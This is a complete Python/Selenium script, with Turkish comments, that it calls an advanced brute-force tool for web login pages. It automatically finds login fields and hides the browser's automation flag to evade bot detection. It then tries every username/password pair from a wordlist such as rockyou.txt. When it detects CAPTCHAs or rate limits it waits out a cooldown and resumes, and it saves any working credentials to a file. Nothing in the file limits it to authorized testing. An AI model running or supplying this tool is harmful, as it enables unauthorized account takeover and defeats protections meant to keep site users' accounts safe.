import argparse
import itertools
import os
import sys
import time
from urllib.parse import urlparse, urlunparse

from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.common.exceptions import (ElementNotInteractableException,
                                        NoSuchElementException,
                                        StaleElementReferenceException,
                                        TimeoutException)
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
from webdriver_manager.chrome import ChromeDriverManager
from webdriver_manager.firefox import GeckoDriverManager

# --- Renkler ---
R = "\033[1;31m"
G = "\033[1;32m"
Y = "\033[1;33m"
B = "\033[1;34m"
C = "\033[1;36m"
W = "\033[0m"

def print_status(message, color=W):
    """Renkli durum mesajları yazdırır."""
    print(f"{color}[*] {message}{W}")

def print_error(message):
    """Hata mesajları yazdırır."""
    print(f"{R}[-] {message}{W}")

def print_success(message):
    """Başarı mesajları yazdırır."""
    print(f"{G}[+] {message}{W}")

def correct_url(url):
    """URL'deki yaygın yazım hatalarını düzeltir."""
    if url.startswith("http//") or url.startswith("https//"):
        url = url.replace("//", "://", 1)
    if not url.startswith("http"):
        print_status(f"URL'ye 'https://' ekleniyor: {url}", Y)
        url = "https://" + url
    return url

def get_driver(browser_name, headless=False):
    """Belirtilen tarayıcı için WebDriver'ı başlatır."""
    print_status(f"{browser_name.capitalize()} başlatılıyor...")
    try:
        if browser_name.lower() == 'chrome':
            options = webdriver.ChromeOptions()
            options.add_argument("--no-sandbox")
            options.add_argument("--disable-dev-shm-usage")
            options.add_argument("--log-level=3")
            options.add_argument("--ignore-certificate-errors")
            options.add_argument("--disable-blink-features=AutomationControlled")
            if headless:
                options.add_argument("--headless")
            service = ChromeService(ChromeDriverManager().install())
            driver = webdriver.Chrome(service=service, options=options)
        elif browser_name.lower() == 'firefox':
            options = webdriver.FirefoxOptions()
            options.accept_insecure_certs = True
            if headless:
                options.add_argument("--headless")
            service = FirefoxService(GeckoDriverManager().install())
            driver = webdriver.Firefox(service=service, options=options)
        else:
            print_error(f"Desteklenmeyen tarayıcı: {browser_name}")
            sys.exit(1)
        
        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        return driver
    except Exception as e:
        print_error(f"WebDriver başlatılırken hata oluştu: {e}")
        print_error("Lütfen tarayıcınızın (Chrome/Firefox) kurulu ve güncel olduğundan emin olun.")
        sys.exit(1)

def find_element_robustly(driver, selectors):
    """Bir öğeyi birden çok seçiciyle sağlam bir şekilde bulur."""
    for selector in selectors:
        try:
            return driver.find_element(By.CSS_SELECTOR, selector)
        except NoSuchElementException:
            continue
    return None

def find_login_elements(driver):
    """Giriş formunu ve öğelerini (iframe dahil) bulur."""
    print_status("Giriş formu ve öğeleri aranıyor...")
    
    # iframe'leri kontrol et
    iframes = driver.find_elements(By.TAG_NAME, "iframe")
    if iframes:
        print_status(f"{len(iframes)} adet iframe bulundu. İçleri kontrol ediliyor...")
        for index, frame in enumerate(iframes):
            try:
                driver.switch_to.frame(frame)
                print_status(f"{index}. iframe'e geçildi.")
                elements = find_elements_in_context(driver)
                if all(elements.values()):
                    print_success("Giriş öğeleri iframe içinde bulundu!")
                    return elements
                driver.switch_to.default_content()
            except Exception as e:
                print_error(f"Iframe'e geçilirken hata: {e}")
                driver.switch_to.default_content()

    # Ana sayfada ara
    elements = find_elements_in_context(driver)
    if all(elements.values()):
        print_success("Giriş öğeleri ana sayfada bulundu!")
        return elements
        
    print_error("Giriş formu veya öğeleri bulunamadı.")
    return None

def find_elements_in_context(driver):
    """Mevcut bağlamda (ana sayfa veya iframe) öğeleri arar."""
    # Yaygın seçiciler
    user_selectors = [
        'input[type="email"]', 'input[type="text"][name*="user"]', 'input#username', 
        'input[name="username"]', 'input[placeholder*="user"]', 'input[autocomplete="username"]'
    ]
    pass_selectors = [
        'input[type="password"]', 'input#password', 'input[name="password"]', 
        'input[placeholder*="assword"]', 'input[autocomplete="current-password"]'
    ]
    submit_selectors = [
        'button[type="submit"]', 'input[type="submit"]', 'button[id*="login"]', 
        'button[name*="login"]', 'button:contains("Log In")', 'button:contains("Sign In")'
    ]

    username_field = find_element_robustly(driver, user_selectors)
    password_field = find_element_robustly(driver, pass_selectors)
    submit_button = find_element_robustly(driver, submit_selectors)
    
    return {"username": username_field, "password": password_field, "submit": submit_button}

def get_input_length_constraints(username_field, password_field):
    """Kullanıcı adı ve şifre alanlarının uzunluk kısıtlamalarını alır."""
    constraints = {
        'user': {'min': 0, 'max': float('inf')},
        'pass': {'min': 0, 'max': float('inf')}
    }
    try:
        if username_field:
            min_len = username_field.get_attribute('minlength')
            max_len = username_field.get_attribute('maxlength')
            if min_len: constraints['user']['min'] = int(min_len)
            if max_len: constraints['user']['max'] = int(max_len)
        if password_field:
            min_len = password_field.get_attribute('minlength')
            max_len = password_field.get_attribute('maxlength')
            if min_len: constraints['pass']['min'] = int(min_len)
            if max_len: constraints['pass']['max'] = int(max_len)
            
        print_status(f"Alan Kısıtlamaları: Kullanıcı Adı (min: {constraints['user']['min']}, max: {constraints['user']['max']}), Şifre (min: {constraints['pass']['min']}, max: {constraints['pass']['max']})", C)
    except Exception as e:
        print_error(f"Uzunluk kısıtlamaları alınırken hata: {e}")
    return constraints

def filter_wordlist(filepath, user_constraints, pass_constraints):
    """Kelime listesini uzunluk kısıtlamalarına göre filtreler."""
    print_status(f"'{filepath}' kelime listesi kısıtlamalara göre filtreleniyor...")
    filtered_list = []
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                word = line.strip()
                if (user_constraints['min'] <= len(word) <= user_constraints['max']) or \
                   (pass_constraints['min'] <= len(word) <= pass_constraints['max']):
                    filtered_list.append(word)
        print_success(f"Kelime listesi filtrelendi. {len(filtered_list)} uygun kelime bulundu.")
        return filtered_list
    except FileNotFoundError:
        print_error(f"Kelime listesi dosyası bulunamadı: {filepath}")
        sys.exit(1)

def attempt_login(driver, username_field, password_field, submit_button, username, password):
    """Bir giriş denemesi yapar."""
    try:
        # Değerleri girmek için JavaScript kullan
        driver.execute_script("arguments[0].value = arguments[1];", username_field, username)
        driver.execute_script("arguments[0].dispatchEvent(new Event('input', { bubbles: true }));", username_field)
        driver.execute_script("arguments[0].dispatchEvent(new Event('change', { bubbles: true }));", username_field)
        
        driver.execute_script("arguments[0].value = arguments[1];", password_field, password)
        driver.execute_script("arguments[0].dispatchEvent(new Event('input', { bubbles: true }));", password_field)
        driver.execute_script("arguments[0].dispatchEvent(new Event('change', { bubbles: true }));", password_field)

        time.sleep(0.5) # Girişlerin işlenmesi için kısa bir bekleme

        # Tıklama için JavaScript kullan
        driver.execute_script("arguments[0].click();", submit_button)
        return True
    except (ElementNotInteractableException, StaleElementReferenceException) as e:
        print_error(f"Giriş elemanları ile etkileşimde hata: {e}")
        return False
    except Exception as e:
        print_error(f"Giriş denemesi sırasında beklenmedik hata: {e}")
        return False

def check_for_rate_limiting(driver, attempt_count):
    """Hız sınırlaması veya captcha kontrolü yapar."""
    if attempt_count > 0 and attempt_count % 15 == 0: # Her 15 denemede bir kontrol et
        print_status("Hız sınırlaması kontrol ediliyor...", Y)
        page_source = driver.page_source.lower()
        limit_keywords = ["captcha", "too many attempts", "rate limit", "çok fazla deneme"]
        if any(keyword in page_source for keyword in limit_keywords):
            print_error("Hız sınırlaması veya CAPTCHA tespit edildi!")
            return True
    return False

def main():
    parser = argparse.ArgumentParser(description=f"{C}Gelişmiş Brute-Force Aracı{W}")
    parser.add_argument("url", help="Hedef URL (örn: https://example.com/login)")
    parser.add_argument("-w", "--wordlist", default="/usr/share/wordlists/rockyou.txt", help="Kullanıcı adı ve şifreler için kelime listesi yolu")
    parser.add_argument("-b", "--browser", default="firefox", choices=["chrome", "firefox"], help="Kullanılacak tarayıcı (chrome/firefox)")
    parser.add_argument("--headless", action="store_true", help="Tarayıcıyı görünmez modda çalıştır")
    parser.add_argument("--cooldown", type=int, default=300, help="Hız sınırlaması tespit edildiğinde bekleme süresi (saniye)")

    args = parser.parse_args()
    
    target_url = correct_url(args.url)
    wordlist_path = args.wordlist
    
    if not os.path.exists(wordlist_path):
        print_error(f"Kelime listesi dosyası bulunamadı: {wordlist_path}")
        print_error("Lütfen '-w' parametresi ile geçerli bir dosya yolu belirtin.")
        sys.exit(1)

    # --- İlk Adım: Sayfayı analiz et ve kısıtlamaları al ---
    driver = None
    try:
        driver = get_driver(args.browser, args.headless)
        print_status(f"Hedef analiz ediliyor: {target_url}")
        driver.get(target_url)
        WebDriverWait(driver, 15).until(lambda d: d.execute_script('return document.readyState') == 'complete')
        
        login_elements = find_login_elements(driver)
        if not login_elements or not all(login_elements.values()):
            print_error("Giriş öğeleri bulunamadı. Betik sonlandırılıyor.")
            return

        constraints = get_input_length_constraints(login_elements['username'], login_elements['password'])
        
    except TimeoutException:
        print_error(f"Sayfa yüklenemedi (Zaman aşımı): {target_url}")
        return
    except Exception as e:
        print_error(f"Sayfa analizi sırasında hata: {e}")
        return
    finally:
        if driver:
            driver.quit()

    # --- İkinci Adım: Kelime listesini filtrele ve saldırıya başla ---
    wordlist = filter_wordlist(wordlist_path, constraints['user'], constraints['pass'])
    combos = list(itertools.product(wordlist, repeat=2)) # user, pass
    
    print_status(f"{len(combos)} olası kombinasyon denenecek.", B)

    start_index = 0
    total_attempts = 0
    
    while start_index < len(combos):
        driver = None
        try:
            driver = get_driver(args.browser, args.headless)
            initial_url_netloc = urlparse(target_url).netloc
            
            # Kaldığı yerden devam et
            for i in range(start_index, len(combos)):
                username, password = combos[i]
                
                # Sadece geçerli uzunluktaki kombinasyonları dene
                if not (constraints['user']['min'] <= len(username) <= constraints['user']['max'] and \
                        constraints['pass']['min'] <= len(password) <= constraints['pass']['max']):
                    continue

                total_attempts += 1
                print_status(f"Deneme {total_attempts}/{len(combos)} -> Kullanıcı: {username}, Şifre: {password}")

                # Her denemeden önce sayfaya git
                driver.get(target_url)
                WebDriverWait(driver, 15).until(lambda d: d.execute_script('return document.readyState') == 'complete')
                
                login_elements = find_login_elements(driver)
                if not login_elements or not all(login_elements.values()):
                    print_error("Giriş öğeleri yeniden bulunamadı. Bu deneme atlanıyor.")
                    continue

                attempt_login(driver, login_elements['username'], login_elements['password'], login_elements['submit'], username, password)
                
                # Sonucun yüklenmesi için bekle
                time.sleep(3) 

                current_url_netloc = urlparse(driver.current_url).netloc
                
                # Başarı kontrolü: URL değişti mi?
                if current_url_netloc != initial_url_netloc or "dashboard" in driver.current_url or "logout" in driver.page_source.lower():
                    print_success(f"Başarılı Giriş! -> Kullanıcı: {username}, Şifre: {password}")
                    print_success(f"Başarılı olunan URL: {driver.current_url}")
                    with open("credentials.txt", "w") as f:
                        f.write(f"URL: {target_url}\n")
                        f.write(f"Username: {username}\n")
                        f.write(f"Password: {password}\n")
                    print_success("Kimlik bilgileri 'credentials.txt' dosyasına kaydedildi.")
                    return # Başarılı olunca çık

                # Hız sınırlaması kontrolü
                if check_for_rate_limiting(driver, total_attempts):
                    start_index = i # Kaldığı indeksi kaydet
                    print_error(f"{args.cooldown} saniye bekleniyor...")
                    driver.quit() # Tarayıcıyı kapat
                    time.sleep(args.cooldown)
                    print_status("Bekleme süresi bitti, devam ediliyor...")
                    break # İç döngüyü kır ve yeni tarayıcı ile yeniden başla
            else:
                # for döngüsü break olmadan biterse
                start_index = len(combos) # Tüm kombinasyonlar denendi

        except Exception as e:
            print_error(f"Ana döngüde bir hata oluştu: {e}")
            start_index += 1 # Hatalı kombinasyonu atla ve devam et
            time.sleep(5)
        finally:
            if driver:
                driver.quit()
    
    print_status("Tüm kombinasyonlar denendi. Başarılı giriş bulunamadı.")

if __name__ == "__main__":
    main() 